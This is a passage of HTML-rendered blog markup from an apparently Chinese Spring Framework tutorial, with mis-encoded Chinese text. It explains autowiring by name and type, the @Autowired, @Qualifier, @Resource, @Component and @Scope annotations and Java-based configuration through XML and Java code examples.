class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog222&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br><br>  <span class="hljs-comment">&lt;!--byName : ä¼šè‡ªåŠ¨åœ¨å®¹å™¨ä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾ï¼Œå’Œè‡ªå·±å¯¹è±¡ set æ–¹æ³•åé¢çš„å€¼å¯¹åº”çš„ beanid--&gt;</span><br>  <span class="hljs-comment">&lt;!--    &lt;bean id=&quot;people&quot; class=&quot;com.kuang.pojo.People&quot; autowire=&quot;byName&quot;&gt;--&gt;</span><br>  <span class="hljs-comment">&lt;!--byName : ä¼šè‡ªåŠ¨åœ¨å®¹å™¨ä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾ï¼Œå’Œè‡ªå·±å¯¹è±¡å±æ€§ç±»å‹ç›¸åŒçš„ bean--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.People&quot;</span> <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;byType&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;was&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--            &lt;property name=&quot;dog&quot; ref=&quot;dog&quot;/&gt;--&gt;</span><br>    <span class="hljs-comment">&lt;!--            &lt;property name=&quot;cat&quot; ref=&quot;cat&quot;/&gt;--&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752708.png" alt="img"></p><p><strong>byType åªå…è®¸æœ‰ä¸€ä¸ªå¯¹è±¡å±æ€§</strong>ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog222&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog22&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>å½“æœ‰å¤šä¸ªå¯¹è±¡ç±»å‹æ—¶ï¼Œä¼šç›´æ¥æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752316.png" alt="img"></p><h3 id="å°ç»“ï¼š"><a href="#å°ç»“ï¼š" class="headerlink" title="å°ç»“ï¼š"></a>å°ç»“ï¼š</h3><ul><li><p>byName</p></li><li><ul><li><strong>éœ€è¦ä¿è¯æ‰€æœ‰beançš„idå”¯ä¸€ï¼Œå¹¶ä¸”è¿™ä¸ªbeanéœ€è¦å’Œè‡ªåŠ¨æ³¨å…¥çš„å±æ€§çš„setæ–¹æ³•çš„å€¼ä¸€è‡´</strong></li><li>å½“ä¸€ä¸ªbeanèŠ‚ç‚¹å¸¦æœ‰ <code>autowire byName</code>çš„å±æ€§æ—¶</li></ul></li></ul><ol><li><ol><li><ol><li>å°†æŸ¥æ‰¾å…¶ç±»ä¸­æ‰€æœ‰çš„setæ–¹æ³•åï¼Œä¾‹å¦‚setCatï¼Œè·å¾—å°†setå»æ‰å¹¶ä¸”é¦–å­—æ¯å°å†™çš„å­—ç¬¦ä¸²ï¼Œå³cat</li><li>å»springå®¹å™¨ä¸­å¯»æ‰¾æ˜¯å¦æœ‰æ­¤å­—ç¬¦ä¸²åç§°idçš„å¯¹è±¡</li><li>å¦‚æœæœ‰ï¼Œå°±å–å‡ºæ³¨å…¥ï¼›å¦‚æœæ²¡æœ‰ï¼Œå°±æŠ¥ç©ºæŒ‡é’ˆå¼‚å¸¸</li></ol></li></ol></li></ol><ul><li><p>byType</p></li><li><ul><li><strong>éœ€è¦ä¿è¯æ‰€æœ‰beançš„classå”¯ä¸€ï¼Œå¹¶ä¸”è¿™ä¸ªbeanéœ€è¦å’Œè‡ªåŠ¨æ³¨å…¥çš„å±æ€§çš„ç±»å‹ä¸€è‡´</strong></li><li>å¦‚æœä¸ä¸€è‡´ï¼Œä¼šæŠ¥å¼‚å¸¸ï¼š<code>NoUniqueBeanDefinitionException</code></li></ul></li></ul><h3 id="2-8-3-ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…"><a href="#2-8-3-ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…" class="headerlink" title="2.8.3 ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…"></a>2.8.3 ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…</h3><p>jdk 1.5æ”¯æŒæ³¨è§£ï¼ŒSpring 2.5 æ”¯æŒæ³¨è§£</p><p><strong>ä½¿ç”¨æ³¨è§£é¡»çŸ¥ï¼š</strong></p><ul><li>å¯¼å…¥çº¦æŸï¼šcontext</li><li>é…ç½®æ³¨è§£çš„æ”¯æŒï¼šcontext:annotation-config</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h4><ul><li>å±æ€§ä¸Šä½¿ç”¨</li><li>setæ–¹å¼ä¸Šä½¿ç”¨</li><li>ä½¿ç”¨Autowiredæˆ‘ä»¬å¯ä»¥ä¸ç”¨ç¼–å†™Setæ–¹æ³•äº†ï¼Œå‰ææ˜¯ä½ è¿™ä¸ªè‡ªåŠ¨è£…é…çš„å±æ€§åœ¨IOCï¼ˆSpringï¼‰å®¹å™¨ä¸­å­˜åœ¨ï¼Œä¸”ç¬¦åˆåå­—</li></ul><p>@Autowired(required&#x3D;false)  è¯´æ˜ï¼šfalseï¼Œå¯¹è±¡å¯ä»¥ä¸ºnullï¼›trueï¼Œå¯¹è±¡å¿…é¡»å­˜å¯¹è±¡ï¼Œä¸èƒ½ä¸ºnullã€‚</p><p>&#x2F;&#x2F;å¦‚æœå…è®¸å¯¹è±¡ä¸ºnullï¼Œè®¾ç½®required &#x3D; false,é»˜è®¤ä¸ºtrue</p><p>@Autowired(required &#x3D; false)</p><p>private Cat cat;</p><p>æµ‹è¯•ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">  https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.People&quot;</span>/&gt;</span><br>&lt;/beans<br>package com.kuang.pojo;<br><br>import org.springframework.beans.factory.annotation.Autowired;<br><br>public class People &#123;<br><br>    @Autowired<br>    private Cat cat;<br>    @Autowired<br>    private Dog dog;<br>    private String name;<br><br>    public Cat getCat() &#123;<br>        return cat;<br>    &#125;<br><br>    public void setCat(Cat cat) &#123;<br>        this.cat = cat;<br>    &#125;<br><br>    public String getName() &#123;<br>        return name;<br>    &#125;<br><br>    public void setName(String name) &#123;<br>        this.name = name;<br>    &#125;<br><br>    public Dog getDog() &#123;<br>        return dog;<br>    &#125;<br><br>    public void setDog(Dog dog) &#123;<br>        this.dog = dog;<br>    &#125;<br><br>    @Override<br>    public String toString() &#123;<br>        return &quot;People&#123;&quot; +<br>        &quot;cat=&quot; + cat +<br>        &quot;, dog=&quot; + dog +<br>        &quot;, name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +<br>        &#x27;&#125;&#x27;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749254.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749467.png" alt="ä¸ä½¿ç”¨setæ–¹æ³•"></p><h4 id="Qualifier"><a href="#Qualifier" class="headerlink" title="@Qualifier"></a>@Qualifier</h4><ul><li>å½“å­˜åœ¨å¤šä¸ªç±»å‹çš„Beanæ—¶ï¼ŒåŠ å…¥@Qualifier å¯ä»¥æ ¹æ®byNameçš„æ–¹å¼è‡ªåŠ¨è£…é…</li><li>@Qualifierä¸èƒ½å•ç‹¬ä½¿ç”¨</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749701.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749605.png" alt="img"></p><h4 id="Resource"><a href="#Resource" class="headerlink" title="@Resource"></a>@Resource</h4><ul><li>@Resourceå¦‚æœ‰æŒ‡å®šçš„nameå±æ€§ï¼Œå…ˆæŒ‰è¯¥å±æ€§è¿›è¡ŒbyNameæ–¹å¼æŸ¥æ‰¾è£…é…ï¼›</li><li>å…¶æ¬¡å†è¿›è¡Œé»˜è®¤çš„byNameæ–¹å¼è¿›è¡Œè£…é…ï¼›</li><li>å¦‚æœä»¥ä¸Šéƒ½ä¸æˆåŠŸï¼Œåˆ™æŒ‰byTypeçš„æ–¹å¼è‡ªåŠ¨è£…é…ã€‚</li><li>éƒ½ä¸æˆåŠŸï¼Œåˆ™æŠ¥å¼‚å¸¸ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752141.png" alt="img"></p><h2 id="2-9-ä½¿ç”¨æ³¨è§£å¼€å‘"><a href="#2-9-ä½¿ç”¨æ³¨è§£å¼€å‘" class="headerlink" title="2.9 ä½¿ç”¨æ³¨è§£å¼€å‘"></a>2.9 ä½¿ç”¨æ³¨è§£å¼€å‘</h2><p>åœ¨spring4ä¹‹åï¼Œæƒ³è¦ä½¿ç”¨æ³¨è§£å½¢å¼ï¼Œå¿…é¡»å¾—è¦å¼•å…¥aopçš„åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749649.png" alt="img"><br> <strong>ä½¿ç”¨æ³¨è§£é¡»çŸ¥ï¼š</strong></p><ul><li>å¯¼å…¥çº¦æŸï¼šcontext</li><li>é…ç½®æ³¨è§£çš„æ”¯æŒï¼šcontext:annotation-config</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-9-1-Bean-å®ç°"><a href="#2-9-1-Bean-å®ç°" class="headerlink" title="2.9.1 Bean å®ç°"></a>2.9.1 Bean å®ç°</h3><p><strong>@Component</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">  https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!--æŒ‡å®šè¦æ‰«æçš„åŒ…ï¼Œè¿™ä¸ªåŒ…ä¸‹é¢çš„æ³¨è§£å°±ä¼šç”Ÿæ•ˆ--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.kuang.pojo&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br>package com.kuang.pojo;<br><br>import org.springframework.stereotype.Component;<br><br>//ç­‰ä»·äº <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>/&gt;</span><br>@Component<br>public class User &#123;<br>    public String name = &quot;qwer&quot;;<br>&#125;<br>import com.kuang.pojo.User;<br>import org.springframework.context.ApplicationContext;<br>import org.springframework.context.support.ClassPathXmlApplicationContext;<br><br>public class MyTest &#123;<br>    public static void main(String[] args) &#123;<br>        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);<br>        User user = (User) context.getBean(&quot;user&quot;);<br><br>        System.out.println(user.name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749773.png" alt="img"></p><h3 id="2-9-2-å±æ€§æ³¨è§£"><a href="#2-9-2-å±æ€§æ³¨è§£" class="headerlink" title="2.9.2 å±æ€§æ³¨è§£"></a>2.9.2 å±æ€§æ³¨è§£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;123&quot;)</span><br><span class="hljs-keyword">public</span> String name;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753469.png" alt="img"></p><h3 id="2-9-3-è¡ç”Ÿæ³¨è§£"><a href="#2-9-3-è¡ç”Ÿæ³¨è§£" class="headerlink" title="2.9.3 è¡ç”Ÿæ³¨è§£"></a>2.9.3 <strong>è¡ç”Ÿæ³¨è§£</strong></h3><p><strong>@Componentä¸‰ä¸ªè¡ç”Ÿæ³¨è§£</strong></p><p>ä¸ºäº†æ›´å¥½çš„è¿›è¡Œåˆ†å±‚ï¼ŒSpringå¯ä»¥ä½¿ç”¨å…¶å®ƒä¸‰ä¸ªæ³¨è§£ï¼ŒåŠŸèƒ½ä¸€æ ·ï¼Œéƒ½æ˜¯å°†æŸä¸ªç±»æ³¨å†Œåˆ°Springä¸­ï¼Œè£…é…Bean</p><ul><li>@Controllerï¼šwebå±‚</li><li>@Serviceï¼šserviceå±‚</li><li>@Repositoryï¼šdaoå±‚</li></ul><h3 id="2-9-4-è‡ªåŠ¨è£…é…æ³¨è§£"><a href="#2-9-4-è‡ªåŠ¨è£…é…æ³¨è§£" class="headerlink" title="2.9.4 è‡ªåŠ¨è£…é…æ³¨è§£"></a>2.9.4 è‡ªåŠ¨è£…é…æ³¨è§£</h3><p>@Autowired ï¼šé€šè¿‡ç±»å‹ã€åå­—è‡ªåŠ¨è£…é…</p><p>@Qualifier ï¼šå¦‚æœ @Autowired ä¸èƒ½å”¯ä¸€è‡ªåŠ¨è£…é…ä¸Šå±æ€§ï¼Œåˆ™é€šè¿‡ @Qualifier(value&#x3D;â€xxxâ€)</p><p>@Resource ï¼š é€šè¿‡åå­—ã€ç±»å‹è‡ªåŠ¨è£…é…</p><h3 id="2-9-5-ä½œç”¨åŸŸ"><a href="#2-9-5-ä½œç”¨åŸŸ" class="headerlink" title="2.9.5 ä½œç”¨åŸŸ"></a>2.9.5 ä½œç”¨åŸŸ</h3><p>@scope</p><ul><li>singletonï¼šé»˜è®¤çš„ï¼ŒSpringä¼šé‡‡ç”¨å•ä¾‹æ¨¡å¼åˆ›å»ºè¿™ä¸ªå¯¹è±¡ã€‚å…³é—­å·¥å‚ ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ä¼šé”€æ¯ã€‚</li><li>prototypeï¼šå¤šä¾‹æ¨¡å¼ã€‚å…³é—­å·¥å‚ ï¼Œæ‰€æœ‰çš„å¯¹è±¡ä¸ä¼šé”€æ¯ã€‚å†…éƒ¨çš„åƒåœ¾å›æ”¶æœºåˆ¶ä¼šå›æ”¶</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç­‰ä»·äº &lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot;/&gt;</span><br><span class="hljs-meta">@Component</span><br><br><span class="hljs-meta">@Scope(&quot;singleton&quot;)</span><br><span class="hljs-comment">//@Scope(&quot;prototype&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-comment">// ç›¸å½“äºé…ç½®æ–‡ä»¶ä¸­ &lt;property name=&quot;name&quot; value=&quot;123&quot;/&gt;</span><br>    <span class="hljs-meta">@Value(&quot;123&quot;)</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-comment">//public String name = &quot;qwer&quot;;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-9-6-å°ç»“"><a href="#2-9-6-å°ç»“" class="headerlink" title="2.9.6 å°ç»“"></a>2.9.6 å°ç»“</h3><p><strong>XMLä¸æ³¨è§£æ¯”è¾ƒ</strong></p><ul><li>XMLå¯ä»¥é€‚ç”¨ä»»ä½•åœºæ™¯ ï¼Œç»“æ„æ¸…æ™°ï¼Œç»´æŠ¤æ–¹ä¾¿</li><li>æ³¨è§£ä¸æ˜¯è‡ªå·±æä¾›çš„ç±»ä½¿ç”¨ä¸äº†ï¼Œå¼€å‘ç®€å•æ–¹ä¾¿</li></ul><p><strong>xmlä¸æ³¨è§£æ•´åˆå¼€å‘</strong> ï¼šæ¨èæœ€ä½³å®è·µ</p><ul><li>xmlç®¡ç†Bean</li><li>æ³¨è§£å®Œæˆå±æ€§æ³¨å…¥</li><li>ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œ å¿…é¡»è®©æ³¨è§£ç”Ÿæ•ˆï¼Œå°±éœ€è¦å¼€å¯æ³¨è§£çš„æ”¯æŒ</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--æŒ‡å®šè¦æ‰«æçš„åŒ…ï¼Œè¿™ä¸ªåŒ…ä¸‹é¢çš„æ³¨è§£å°±ä¼šç”Ÿæ•ˆ--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.kuang&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-10-ä½¿ç”¨Javaçš„æ–¹å¼è¿›è¡Œé…ç½®"><a href="#2-10-ä½¿ç”¨Javaçš„æ–¹å¼è¿›è¡Œé…ç½®" class="headerlink" title="2.10 ä½¿ç”¨Javaçš„æ–¹å¼è¿›è¡Œé…ç½®"></a>2.10 ä½¿ç”¨Javaçš„æ–¹å¼è¿›è¡Œé…ç½®</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753781.png" alt="img"></p><p><strong>JavaConfig æ˜¯ Spring çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œåœ¨ Spring4 ä¹‹åï¼Œä»–æˆäº†ä¸€ä¸ªæ ¸å¿ƒ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 